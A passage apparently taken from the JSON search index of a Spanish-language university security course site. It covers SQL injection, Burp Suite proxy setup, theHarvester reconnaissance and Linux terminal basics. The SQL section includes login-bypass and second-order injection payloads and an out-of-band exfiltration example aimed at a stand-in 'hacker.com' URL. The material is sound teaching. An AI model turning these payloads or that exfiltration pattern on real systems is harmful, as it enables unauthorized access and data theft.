interactuar por medio de una API o algo similar.\u003c/p\u003e\n\u003ch2 id=\"sql\"\u003eSQL\u003c/h2\u003e\n\u003cp\u003eLas inyecciones SQL (o SQLi) son el ataque más conocido en general. Como lo dice el nombre, este se refiere a la\ninyección de comandos SQL en una consulta. Si no conocen SQL, o necesitan refrescar su memoria, los invito a\nver el \u003ca href=\"https://www.w3schools.com/sql/default.asp\"\u003etutorial de w3schools\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eUn ejemplo de esta inyección sería un formulario de login que toma los parámetros entregados por el\nusuario y los usa directamente en la consulta:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT username FROM users WHERE username = '$username' AND password = SHA256('$password');\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLuego esto puede ser aprovechado para ingresar de manera autenticada, sin tener credenciales. La forma de hacerlo\nes ingresando el usuario \u003ccode\u003e' or 1=1; -- - \u003c/code\u003e. Reemplazando esto en la consulta anterior, nos queda:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT username FROM users WHERE username = '' or 1=1; -- - ' AND password = SHA256('$password');\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEsto selecciona a los usuarios que cumplan con \u003ccode\u003eusername = ''\u003c/code\u003e o que \u003ccode\u003e1=1\u003c/code\u003e. El resto del comando está comentado\npor \u003ccode\u003e-- -\u003c/code\u003e. Ya que todos los usuarios cumplen con esta condición, el atacante se autentica ingresa de manera\nautenticada como el primer usuario que aparezca en la respuesta.\u003c/p\u003e\n\u003cp\u003eLas inyecciones se dividen en 2 tipos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNon Blind\u003c/strong\u003e: En donde las respuestas a las consultas se retornan directamente al atacante, y por lo tanto puede\nrobarse toda la información muy rápidamente.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBlind\u003c/strong\u003e: Las respuestas a las consultas no se muestran en ninguna parte, por lo que se debe utilizar otras técnicas\npara obtener la información. Esto usualmente significa consultar caracter por caracter (el nombre de usuario\nempieza con a?), y distinguir las respuestas en base al comportamiento del servidor.\nEstos nuevamente se dividen en 2:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBoolean Based\u003c/strong\u003e: El servidor realiza una acción dependiendo de si la consulta fue exitosa o no. Por ejemplo,\nlanzar un error, autenticar a un usuario, ejecutar un proceso, etc.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTime Based\u003c/strong\u003e: Esta técnica se basa en el tiempo de respuesta del servidor. La forma de utilizarla es hacer una\nconsulta que intencionalmente haga esperar al servidor en ciertos casos. Por ejemplo, si el nombre de usuario\nempieza con a, espera 5 segundos y retorna, sino retorna inmediatamente.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa herramienta \u003ca href=\"https://github.com/sqlmapproject/sqlmap\"\u003esqlmap\u003c/a\u003e se utiliza mucho para hacer un análisis\nautomatizado de este tipo de inyecciones. Envía un conjunto de requests estándar, el cual se adapta a la\ninformación recolectada y otros parámetros, con lo cual puede detectar la gran mayoría de las inyecciones\nsimples. Muchas veces esta herramienta sola no es suficiente, por lo que deberán crear scripts de \u003cem\u003etamper\u003c/em\u003e\nespecíficos para su situación, o realizar en análisis de otra forma.\u003c/p\u003e\n\u003ch2 id=\"otros-tipos\"\u003eOtros Tipos\u003c/h2\u003e\n\u003cp\u003eExisten muchos otros tipos de inyecciones que no veremos en este curso, pero es bueno que sepan que existen.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNoSQL\u003c/strong\u003e: Similar a las SQLi, pero en sistemas NoSQL. Esto tiene diferencias de sintaxis y añade comandos y\nfunciones no disponibles en SQL.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eXML\u003c/strong\u003e: El Extensible Markup Language (XML) se utiliza en muchos lados y es notorio por sus riesgos de seguridad,\nya que tiene hartas funcionalidades explotables. Algunas categorías de inyección XML son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTag Injection\u003c/li\u003e\n\u003cli\u003eXML eXternal Entities (XXE)\u003c/li\u003e\n\u003cli\u003eXML Entity Expansion (XEE)\u003c/li\u003e\n\u003cli\u003eXPath\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eLightweight Directory Access Protocol\u003c/strong\u003e (LDAP): Este es una especie de motor de búsqueda dentro de directorios\ny archivos, y de vez en cuando se utiliza para procesar consultas web.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"técnicas-avanzadas\"\u003eTécnicas Avanzadas\u003c/h2\u003e\n\u003cp\u003eExisten técnicas avanzadas de inyección que se escapan del ámbito del curso. Si se interesan, a continuación\npueden encontrar un pequeño resumen.\u003c/p\u003e\n\u003ch3 id=\"out-of-band-oob\"\u003eOut Of Band (OOB)\u003c/h3\u003e\n\u003cp\u003eMuchas veces el sistema que está siendo analizado es efectivamente vulnerable a inyecciones, pero no es posible\nobtener los resultados, ni siquiera con métodos ciegos. En estos casos se puede intentar una inyección fuera\nde banda o \u003cem\u003eOut Of Band\u003c/em\u003e (OOB). El objetivo es obtener los resultados a la consulta por medio de un canal\ndiferente al cual se realizó la inyección.\u003c/p\u003e\n\u003cp\u003ePor ejemplo, supongamos que además de la inyección, es posible\nenviar un request a otro servidor. Luego, la información podría ser filtrada al enviarla a una URL controlada\npor el atacante, como \u003ccode\u003ehttps://hacker.com?data=\u0026lt;data\u0026gt;\u003c/code\u003e. Esta técnica se puede combinar con inyecciones de tipo\nBlind y Non Blind.\u003c/p\u003e\n\u003ch3 id=\"second-order\"\u003eSecond Order\u003c/h3\u003e\n\u003cp\u003eDe vez en cuando sucede que una inyección no se ejecuta al momento de enviar el payload, sino que este queda\nalmacenado. Luego al acceder a este más adelante, se logra la inyección. Se llaman inyecciones de segundo\norden porque se explotan por medio de 2 requests:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eSe envía el payload, el cual queda almacenado.\u003c/li\u003e\n\u003cli\u003eSe intenta acceder a los datos almacenados, en donde se realiza la inyección.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eEstas vulnerabilidades surgen porque los desarrolladores usualmente consideran los valores controlados\npor el usuario inseguros, pero una vez que ya se almacenan en la base de datos son confiables.\nEsto no necesariamente es así, ya que un valor almacenado en la base de datos puede haber sido\nalterado por un usuario. Es decir, ningún valor es confiable, y las consultas a la base de datos\nsiempre se deben hacer de manera segura sin importar de dónde provengan los datos.\u003c/p\u003e\n\u003cp\u003ePara ilustrar esto, imaginemos un sitio vulnerable a inyecciones SQL de segundo orden,\nen donde nos registramos con el usuario \u003ccode\u003euser' or '1'='1\u003c/code\u003e. Esto no causa una inyección, pues los formularios\nde registro y de login están bien sanitizados.\nLuego, ingresamos al portal y vemos nuestro perfil, en donde el servidor realiza la consulta:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT data FROM users WHERE username = '$username';\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eReemplazando la variable por nuestro usuario obtenemos:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT data FROM users WHERE username = 'user' or '1'='1';\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEs decir, estamos seleccionando el campo \u003ccode\u003edata\u003c/code\u003e de todos los usuarios en la base de datos. Esta técnica\ntambién puede ser combinada con inyecciones de tipo Blind y Non Blind.\u003c/p\u003e\n"},{id:23,href:"/docs/anexos/proxy/",title:"Proxy",description:null,content:"\u003cp\u003ePara poder realizar el análisis web de manera efectiva es necesario instalar un proxy que sea capaz de interceptar,\nmodificar y reenviar todos los requests hacia el servidor, al igual que sus respuestas respectivas.\nEn este caso utilizaremos el navegador FireFox, e instalaremos el plugin FoxyProxy para administrar la conexión\nal proxy, el cual será Burp Suite Community Edition.\u003c/p\u003e\n\u003ch2 id=\"foxyproxy\"\u003eFoxyProxy\u003c/h2\u003e\n\u003cp\u003ePrimero es necesario instalar el plugin. Para eso, ingresar a la tienda de extensiones de FireFox y buscar\npor FoxyProxy, o simplemente ingresar a este \u003ca href=\"https://addons.mozilla.org/es/firefox/addon/foxyproxy-standard/\"\u003elink\u003c/a\u003e.\nInstalar el plugin haciendo click en \u003ccode\u003eAgregar a Firefox\u003c/code\u003e y luego otorgándole los permisos que solicite.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../foxyproxy-install.png\" alt=\"Instalar FoxyProxy\"\u003e\u003c/p\u003e\n\u003cp\u003eUna vez instalado, hacer click en el ícono del plugin arriba a la derecha. Esto abrirá unas opciones, de las\ncuales se debe hacer click en \u003ccode\u003eOptions\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../foxyproxy-options.png\" alt=\"FoxyProxy Options\"\u003e\u003c/p\u003e\n\u003cp\u003eDentro de \u003ccode\u003eOptions\u003c/code\u003e, hacer click en \u003ccode\u003eAdd\u003c/code\u003e para empezar a crear las configuraciones del proxy.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../foxyproxy-add.png\" alt=\"FoxyProxy Add\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, llenar los campos de la siguiente manera: \u003ccode\u003eTitle: Burp\u003c/code\u003e, \u003ccode\u003eProxy Type: HTTP\u003c/code\u003e,\n\u003ccode\u003eProxy IP Address: 127.0.0.1\u003c/code\u003e, \u003ccode\u003ePort: 8080\u003c/code\u003e. Luego guardar.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../foxyproxy-settings.png\" alt=\"FoxyProxy Settings\"\u003e\u003c/p\u003e\n\u003cp\u003ePara empezar a redirigir la comunicación a través del proxy, hacer click en el ícono del plugin y seleccionar\nla opción \u003ccode\u003eBurp\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../foxyproxy-activate.png\" alt=\"FoxyProxy Activate\"\u003e\u003c/p\u003e\n\u003ch2 id=\"burp-suite\"\u003eBurp Suite\u003c/h2\u003e\n\u003cp\u003eAhora configuraremos Burp Suite para que puedan interceptar el tráfico. Si están usando Kali Linux ya lo deberían\ntener instalado. De no ser así, descárguenlo de este \u003ca href=\"https://portswigger.net/burp/communitydownload\"\u003elink\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eLo que necesitamos hacer es instalar el certificado de firma de Burp en FireFox para poder interceptar\ny modificar comunicaciones HTTPS. Esto es necesario, ya que Burp recibe mensajes encriptado,\ny luego debe poder desencriptarlos para leerlos. Además, en caso de que el mensaje sea modificado, debe poder\nvolver a encriptarlos. Para realizar esto, el navegador establece una comunicación cifrada con Burp, y a su vez\nBurp establece una comunicación encriptada con el servidor. El navegador necesita tener instalado el certificado\npara poder confiar en Burp antes de establecer la conexión.\u003c/p\u003e\n\u003cp\u003ePara descargar el certificado, abrir Burp. Aparecerá una ventana de configuración, simplemente hagan click\nen \u003ccode\u003eNext\u003c/code\u003e y luego \u003ccode\u003eStart Burp\u003c/code\u003e. Una vez terminado el proceso, en FireFox activar FoxyProxy e ingresar a la URL\n\u003ca href=\"http://burp/\"\u003ehttp://burp/\u003c/a\u003e. Haciendo click en \u003ccode\u003eCA Certificate\u003c/code\u003e se descarga el certificado.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../burp-certificate.png\" alt=\"Burp Certificate\"\u003e\u003c/p\u003e\n\u003cp\u003eLuego, ingresar a las \u003ca href=\"about:preferences\"\u003epreferencias\u003c/a\u003e de FireFox y buscar por la opción \u003ccode\u003ecertificates\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../firefox-preferences.png\" alt=\"Firefox Preferences\"\u003e\u003c/p\u003e\n\u003cp\u003ePara instalar el certificado, hacer click en \u003ccode\u003eView Certificates\u003c/code\u003e, y en la pestaña \u003ccode\u003eAuthorities\u003c/code\u003e\nimportar el certificado. Deberán seleccionar el archivo recientemente descargado (probablemente en\nsu directorio \u003ccode\u003eDownloads\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../firefox-import.png\" alt=\"Firefox Import\"\u003e\u003c/p\u003e\n\u003cp\u003eUna vez hecho esto, ya está todo listo para comenzar a usar Burp Suite.\u003c/p\u003e\n"},{id:24,href:"/docs/osint/theharvester/",title:"The Harvester",description:null,content:"\u003cp\u003eTheHarvester es una herramienta utilizada para buscar subdominios, IPs y correos asociados a un dominio\nparticular. Esto se hace por medio de motores de búsqueda, como Google, Bing, DuckDuckGo, Github, Linkedin,\nTwitter, etc. Pueden encontrar la herramienta \u003ca href=\"https://github.com/laramies/theHarvester\"\u003eaquí\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eEsto es muy útil para hacer análisis perimetrales de una empresa, en donde no se conoce todos los subdominios\nque posee. También sirve para encontrar posibles usuarios, para luego realizar ataques de fuerza bruta,\no buscar más información sobre estas personas.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eQueremos encontrar información relacionada al dominio \u003ccode\u003euchile.cl\u003c/code\u003e. Utilizamos la flag \u003ccode\u003e-d\u003c/code\u003e para determinar el\ndominio que será buscado y \u003ccode\u003e-b\u003c/code\u003e para especificar el motor de búsqueda. Google suele ser el más efectivo, por lo\nque lo elegimos.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../theharvester1.png\" alt=\"theHarvester Query\"\u003e\u003c/p\u003e\n\u003cp\u003eObtenemos los resultados y observamos que no se encontró IPs, pero sí se logró encontrar muchos emails y\nsubdominios, de los cuales la gran mayoría tiene una IP asignada.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../theharvester2.png\" alt=\"theHarvester Results\"\u003e\u003c/p\u003e\n"},{id:25,href:"/docs/anexos/comandos/",title:"Comandos de Terminal de Linux",description:null,content:"\u003cp\u003eUna \u003cem\u003eShell\u003c/em\u003e o \u003cem\u003eTerminal\u003c/em\u003e en la práctica es una interfaz de usuario de texto que permite la ejecución de comandos y programas de tipo script.\u003c/p\u003e\n\u003cp\u003eEn sistemas Linux modernos, puedes interactuar con la \u003cem\u003eShell\u003c/em\u003e usando un emulador de terminal. En varias distribuciones actuales, el emulador de terminal por defecto es \u003ccode\u003ebash\u003c/code\u003e. Sin embargo, en Kali Linux la shell usada por defecto es \u003ccode\u003ezsh\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"abrir-una-ventana-de-terminal\"\u003eAbrir una ventana de terminal\u003c/h2\u003e\n\u003cp\u003eCuando abres una venta del terminal (en Kali linux puedes hacerlo con \u003ccode\u003eCtrl+Alt+T\u003c/code\u003e), esta parte posicionada en una carpeta específica. En general, esa carpeta es la carpeta \u003ccode\u003e$HOME\u003c/code\u003e de tu usuario (Algo así como \u003ccode\u003e/home/_nombreusuario_\u003c/code\u003e). Desde esta ruta, puedes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eEjecutar comandos\u003c/li\u003e\n\u003cli\u003eMoverte entre carpetas\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ejecutar-comandos\"\u003eEjecutar Comandos\u003c/h2\u003e\n\u003cp\u003eLas shell tienen dos tipos de comandos que pueden ejecutar:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eComandos internos\u003c/strong\u003e, los cuales son \u0026ldquo;keywords especiales\u0026rdquo; de la shell y permiten ejecutar acciones que no están asociadas a un programa en el computador\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003eEjemplos\u003c/em\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eecho HOLA\u003c/code\u003e escribe \u003ccode\u003eHOLA\u003c/code\u003e en la terminal.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecd hola\u003c/code\u003e ingresa a la carpeta \u003ccode\u003ehola\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eComandos externos\u003c/strong\u003e o aplicaciones, los cuales corresponden a aplicaciones guardadas en rutas del computador específicas (las cuales están definidas en la variable \u003ccode\u003e$PATH\u003c/code\u003e). Si el programa no está guardado en una ruta específica, hay que escribir la ruta completa.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ePara ejecutar un comando externo (programa), debo escribir la \u003cem\u003eruta absoluta\u003c/em\u003e (se explica más adelante este concepto) de la ubicación del programa, o escribir una \u003cem\u003eruta relativa\u003c/em\u003e si es que el programa no se encuentra en la misma carpeta en la que estoy.\u003c/p\u003e\n\u003cp\u003eSi el programa se encuentra en la misma carpeta en la que estoy, debo ejecutarlo así: `./programa , donde \u003cem\u003eprograma\u003c/em\u003e es el nombre del programa en la misma carpeta. (más adelante se explica por qué esto funciona).\u003c/p\u003e\n\u003cp\u003eSi el programa se encuentra en una ruta definida en el \u003ccode\u003e$PATH\u003c/code\u003e, puedo escribir su nombre solo.\u003c/p\u003e\n\u003ch2 id=\"variables\"\u003eVariables\u003c/h2\u003e\n\u003cp\u003eEn la shell, es posible crear variables definiéndolas con \u003ccode\u003eNOMBRE_VAR=$(valor)\u003c/code\u003e, donde \u003ccode\u003eNOMBRE_VAR\u003c/code\u003e es el nombre de la variable y \u003ccode\u003evalor\u003c/code\u003e es el comando que genera el valor.\u003c/p\u003e\n\u003cp\u003ePara usar esa variable en otro comando, debo anteponerle el símbolo \u003ccode\u003e$\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEjemplo\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"nv\"\u003eVAR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e HOLA\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$VAR\u003c/span\u003e\u003cspan class=\"s2\"\u003e mundo\u0026#34;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"variables-predefinidas\"\u003eVariables Predefinidas\u003c/h3\u003e\n\u003cp\u003eEl terminal tiene disponibles algunas variables útiles desde que inicia:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e$PATH\u003c/code\u003e es una lista de rutas absolutas, separadas por \u003ccode\u003e:\u003c/code\u003e, en las cuales se buscan los comandos externos si se ejecutan solo por su nombre. En general, rutas como \u003ccode\u003e/usr/bin\u003c/code\u003e, \u003ccode\u003e/usr/local/bin\u003c/code\u003e, \u003ccode\u003e/usr/local/sbin\u003c/code\u003e, entre otros.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e$HOME\u003c/code\u003e es la ruta a la carpeta personal del usuario. En general es \u003ccode\u003e/home/\u0026lt;nombre_usuario\u0026gt;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e$PWD\u003c/code\u003e es la ruta en la que se está ubicado en ese momento.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"rutas\"\u003eRutas\u003c/h2\u003e\n\u003cp\u003ePara saber en qué carpeta estoy en el terminal, puedo escribir el comando interno \u003ccode\u003epwd\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003ePara moverme entre carpetas, puedo escribir \u003ccode\u003ecd _ruta_\u003c/code\u003e, donde \u003cem\u003eruta\u003c/em\u003e es la ruta a la que me quiero mover. ¿Pero cómo escribo la ruta?\u003c/p\u003e\n\u003cp\u003eEn los terminales existen dos formas de escribir rutas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eRutas Relativas\u003c/strong\u003e: son las rutas que parten sin slash. Para usar estas rutas se considera el directorio actual (\u003ccode\u003e$PWD\u003c/code\u003e), al cual se le concatena la ruta relativa.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEjemplos\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eSi escribo \u003ccode\u003ecd Downloads\u003c/code\u003e apenas abra el terminal, me moveré a \u003ccode\u003e/home/kali/Downloads\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSi escribo \u003ccode\u003ecd home\u003c/code\u003e apenas abra el terminal, probablemente me tire un error (porque en la carpeta \u003ccode\u003e/home/kali\u003c/code\u003e no existe la carpeta \u003ccode\u003ehome\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRutas Absolutas\u003c/strong\u003e: son las rutas que parten con un slash. Estas rutas se resuelven desde la raíz del disco.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEjemplos\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eSi escribo \u003ccode\u003ecd /Downloads\u003c/code\u003e apenas abra el terminal, probablemente me tire un error (porque no existe la carpeta \u003ccode\u003eDownloads\u003c/code\u003e en la raíz del sistema de archivos)\u003c/li\u003e\n\u003cli\u003eSi escribo \u003ccode\u003ecd /home/kali/Downloads\u003c/code\u003e apenas abra el terminal, me moveré a exactamente esa ruta.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"carpetas-especiales\"\u003eCarpetas especiales\u003c/h3\u003e\n\u003cp\u003eEn todas las carpetas de Linux hay 2 carpetas especiales:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e.\u003c/code\u003e, la cual apunta a sí misma. Esta carpeta se usa para ejecutar programas que están ubicados en la misma carpeta actual (\u003ccode\u003epwd\u003c/code\u003e).\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEjemplo\u003c/strong\u003e: \u003ccode\u003e./comando\u003c/code\u003e considerando que el programa \u003ccode\u003ecomando\u003c/code\u003e se ubica en la carpeta actual.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e..\u003c/code\u003e, la cual apunta a la carpeta superior. Esta carpeta se usa para devolverse entre carpetas.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"ejecutar-como-superusuario\"\u003eEjecutar como superusuario\u003c/h3\u003e\n\u003cp\u003eNo entraremos mucho en detalle en esta parte, pero en Linux existe un tipo de usuario con poderes ilimitados, el cual es conocido como \u003cem\u003esuperusuario\u003c/em\u003e. En general, suele llamarse \u003cem\u003eroot\u003c/em\u003e, pero también es posible asignar a usuarios distintos poderes similares a los del superusuario.\u003c/p\u003e\n\u003cp\u003eCuando estos poderes están asignados (en Kali Linux están asignados por defecto al usuario \u003cem\u003ekali\u003c/em\u003e), puedes ejecutar programas con estos poderes anteponiendo la palabra \u003ccode\u003esudo\u003c/code\u003e al comando que quieres ejecutar. A veces para confirmar la ejecución, la terminal te pide la contraseña del usuario actual.\u003c/p\u003e\n\u003ch2 id=\"pasar-parámetros-a-un-comando\"\u003ePasar parámetros a un comando\u003c/h2\u003e\n\u003cp\u003eCuando se ejecuta un comando, éste en general puede recibir parámetros o argumentos. La estructura de los parámetros es distinta para cada comando, sin embargo, en todos los casos ;os argumentos se separan por espacios. Las siguientes estructuras se suelen dar para definir argumentos de los comandos, las cuales no son excluyentes entre sí.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eArgumentos posicionales\u003c/strong\u003e: es una cadena de texto limitada por espacios. Si se quiere entregar un argumento que contenga espacios, hay que envolver el texto en comillas. \u003cstrong\u003eEjemplo\u003c/strong\u003e: \u003ccode\u003ecomando bla ble bli\u003c/code\u003e recibe 3 argumentos: \u003ccode\u003ebla\u003c/code\u003e, \u003ccode\u003eble\u003c/code\u003e, \u003ccode\u003ebli\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFlags de una letra\u003c/strong\u003e: Parámetro parte por un guion, seguido de una letra (mayúscula o minúscula). A veces al parámetro le sigue un valor (igual que antes, delimitado por espacios). Otras veces, el parámetro y su valor están unidos por un signo \u003ccode\u003e=\u003c/code\u003e A veces la opción no lleva nada después. \u003cstrong\u003eEjemplos\u003c/strong\u003e: \u003ccode\u003ecomando -a -b ble\u003c/code\u003e, \u003ccode\u003ecomando2 -c=bli\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFlags de muchas letras\u003c/strong\u003e: Parámetro parte por dos guiones, seguido de texto (letras, números, guiones). Al igual que en el caso anterior, puede tener un valor asignado, el cual está separado del argumento por un espacio o un signo igual. Incluso en algunos casos, la opción de muchas letras parte solo con un guion. \u003cstrong\u003eEjemplos\u003c/strong\u003e: \u003ccode\u003ecomando --flag-larga=bla\u003c/code\u003e, \u003ccode\u003ecomando2 --flag-larga ble\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"entrada-estándar-salida-estándar-y-salida-de-errores\"\u003eEntrada Estándar, Salida Estándar y Salida de Errores\u003c/h2\u003e\n\u003cp\u003eSe conoce como \u003cem\u003eentrada estándar\u003c/em\u003e (\u003ccode\u003estdin\u003c/code\u003e) en la terminal a el campo de texto por el cual uno escribe los comandos. Entonces, los comandos que usan la entrada estándar reciben los datos por defecto desde el mismo terminal.\u003c/p\u003e\n\u003cp\u003ePor otro lado, la \u003cem\u003esalida estándar\u003c/em\u003e (\u003ccode\u003estdout\u003c/code\u003e) es la misma pantalla de terminal, es decir, por donde se muestran los valores de ejecución de nuestros comandos y los textos que se usan como argumentos de comandos como \u003ccode\u003ecat\u003c/code\u003e o \u003ccode\u003eecho\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eAdemás, cuando un programa genera mensajes de error, estos mensajes suelen salir por la \u003cem\u003esalida de errores estándar\u003c/em\u003e (\u003ccode\u003estderr\u003c/code\u003e). Por defecto, los errores son redirigidos a la pantalla del terminal, al igual que los mensajes de la salida estándar.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEjemplo\u003c/strong\u003e si uno ejecuta solamente el comando \u003ccode\u003ecat\u003c/code\u003e sin parámetros, el programa se quedará esperando entrada desde la \u003cem\u003eentrada estándar\u003c/em\u003e. Esto significa que uno podrá escribir libremente texto, el cual será devuelto por la \u003cem\u003esalida estándar\u003c/em\u003e cada vez que presiones \u003ccode\u003eenter\u003c/code\u003e. Para detener la entrada de texto, hay que enviar la señal \u003ccode\u003eEOF\u003c/code\u003e (End of File), la cual se ejecuta con la combinación de teclas \u003ccode\u003eCtrl+D\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"concatenar-comandos\"\u003eConcatenar comandos\u003c/h2\u003e\n\u003cp\u003eSi se quieren concatenar las salidas de distintos comandos para hacerlas entradas de otros comandos, se usa el operador \u003ccode\u003epipe\u003c/code\u003e (\u003ccode\u003e|\u003c/code\u003e). Por ejemplo, si quiero ejecutar \u003ccode\u003estrings\u003c/code\u003e sobre un archivo y luego pasar esa salida por un \u003ccode\u003egrep\u003c/code\u003e, lo hago de la siguiente forma:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003estrings archivo.bin \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;CC5325\u0026#34;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eEl terminal mostrará solo la salida de \u003ccode\u003egrep\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"leer-y-escribir-archivos\"\u003eLeer y escribir archivos\u003c/h2\u003e\n\u003cp\u003eSi quiero que \u003cstrong\u003ela entrada estándar\u003c/strong\u003e de un comando sea el contenido de un archivo, puedo usar el operador \u003ccode\u003emenor-que\u003c/code\u003e (\u003ccode\u003e\u0026lt;\u003c/code\u003e) al final del comando:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003egrep CC5325 \u0026lt; archivo.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSi quiero que \u003cstrong\u003ela salida estándar\u003c/strong\u003e de un comando se guarde en un archivo (sobreescribiéndolo si existe), puedo usar el operador \u003ccode\u003emayor-que\u003c/code\u003e (\u003ccode\u003e\u0026gt;\u003c/code\u003e) al final del comando:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003estrings archivo.bin \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;CC5325\u0026#34;\u003c/span\u003e \u0026gt; salida.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSi quiero que \u003cstrong\u003ela salida estándar\u003c/strong\u003e de un comando se guarde en un archivo 